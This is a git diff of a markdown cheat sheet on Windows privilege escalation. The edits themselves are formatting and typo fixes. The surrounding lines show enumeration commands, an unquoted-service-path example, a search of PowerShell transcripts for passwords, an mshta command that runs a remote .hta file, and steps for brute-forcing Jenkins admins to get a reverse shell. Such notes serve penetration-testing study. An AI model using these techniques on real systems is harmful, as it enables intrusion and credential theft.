@@ -129,7 +129,7 @@ C:\Windows\System32\runas.exe user:ACCESS\Administator savecred "C:\Windows\S
 wmic startup get caption,command 2>nul
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-You can find them using powerup.ps1
+#You can find them using powerup.ps1
 ```
 ## AlwaysInstallElevated
 ```powershell
@@ -143,7 +143,6 @@ Find using powerup.ps1 OR winPEAS
 ## Unquoted service path
 ```powershell
 ## Unquoted service path
-```powershell
 #Lets suppose we have this service running
 C:\FTPServer\FTP server\filezilla\filezilla.exe
 #Notice the space between the 'FTP' and 'server'
@@ -212,7 +211,7 @@ C:\Users\zeyad\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHo
 ```
 ## Powershell Trascript
 - This service logges the PowerShell session from commands and output  of the commands.
-- Defualt logfile place is C:\Users\%USER%\Documents
+- Default logfile place is C:\Users\%USER%\Documents
 ```powershell
 #Example 
 cat C:\Users\zeyad\DocumentsFILE.txt | select-string "pass","cred"
@@ -228,11 +227,11 @@ mshta.exe http://<URL>.hta
 ```
 ---
 ## Feature Abuse - Enterprise applications
--**Jenkins** : Runs as a local admin so getting a shell from it will let us own the machine we are on.
--- Visit the url then  find the admin user then brute force the password
--- After you get in ,navigate to /script and get a groovy payload to execute commands or get a reverse shell.
--- Suggested to try the username as the password or the reverse of the username as a password.
--- if you didn't manage to have access as an admin but you had access as a user you can abuse a project that you can "CONFIGURE" to get OS command execution.
--- Easy way to look for a Configurable project if there are many projects is to navigate to a project then adding ""/configure" and then bruteforce projects using burpsuite or whatever.
+- **Jenkins** : Runs as a local admin so getting a shell from it will let us own the machine we are on.
+	-  Visit the url then  find the admin user then brute force the password
+	- After you get in ,navigate to /script and get a groovy payload to execute commands or get a reverse shell.
+	 - Suggested to try the username as the password or the reverse of the username as a password.
+	- if you didn't manage to have access as an admin but you had access as a user you can abuse a project that you can "CONFIGURE" to get OS command execution.
+	- Easy way to look for a Configurable project if there are many projects is to navigate to a project then adding ""/configure" and then bruteforce projects using burpsuite or whatever.
 ## Useful links
 - [**More Resources for PrivESC**](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources)
